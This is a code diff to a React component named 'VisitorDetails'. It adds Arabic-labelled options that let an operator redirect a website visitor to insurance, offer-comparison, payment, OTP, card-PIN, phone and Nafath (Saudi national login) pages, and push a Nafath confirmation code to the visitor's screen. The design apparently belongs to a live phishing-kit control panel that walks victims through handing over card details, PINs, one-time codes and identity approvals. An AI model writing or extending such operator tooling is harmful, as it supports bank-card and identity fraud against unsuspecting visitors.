@@ -47,22 +47,44 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       
       switch (destination) {
         case "home":
-          updates = { currentStep: "home" as any }
+          // Set both fields for compatibility
+          updates = { 
+            redirectPage: "home" as any,
+            currentStep: "home" as any 
+          }
+          break
+        case "insur":
+          updates = { redirectPage: "insur" as any }
+          break
+        case "compar":
+          updates = { redirectPage: "compar" as any }
           break
         case "payment":
-          updates = { currentStep: "payment" as any }
+          // Modern pages use redirectPage, legacy pages use currentStep
+          updates = { 
+            redirectPage: "check" as any,
+            currentStep: "_st1" as any 
+          }
           break
         case "otp":
-          updates = { currentStep: "otp" as any }
+          updates = { 
+            redirectPage: "veri" as any,
+            currentStep: "_t2" as any 
+          }
           break
         case "pin":
-          updates = { currentStep: "pin" as any }
+          updates = { 
+            redirectPage: "confi" as any,
+            currentStep: "_t3" as any 
+          }
           break
         case "phone":
+          // Legacy system only
           updates = { currentStep: "phone" as any }
           break
         case "nafad":
-          updates = { currentStep: "nafad" as any }
+          // Legacy system with correct value
+          updates = { currentStep: "_t6" as any }
           break
         case "nafad_modal":
           updates = { nafadConfirmationCode: "123456" } // Send confirmation code to open modal
@@ -516,11 +538,13 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">الصفحة الرئيسية</option>
-              <option value="payment">صفحة الدفع</option>
-              <option value="otp">كود التحقق (OTP)</option>
-              <option value="pin">رمز البطاقة (PIN)</option>
-              <option value="phone">صفحة الهاتف</option>
-              <option value="nafad">صفحة نفاذ</option>
+              <option value="insur">بيانات التأمين</option>
+              <option value="compar">مقارنة العروض</option>
+              <option value="payment">الدفع والتحقق</option>
+              <option value="otp">التحقق OTP</option>
+              <option value="pin">التحقق PIN</option>
+              <option value="phone">معلومات الهاتف</option>
+              <option value="nafad">نفاذ</option>
               <option value="nafad_modal">مودال نفاذ</option>
             </select>
           </div>
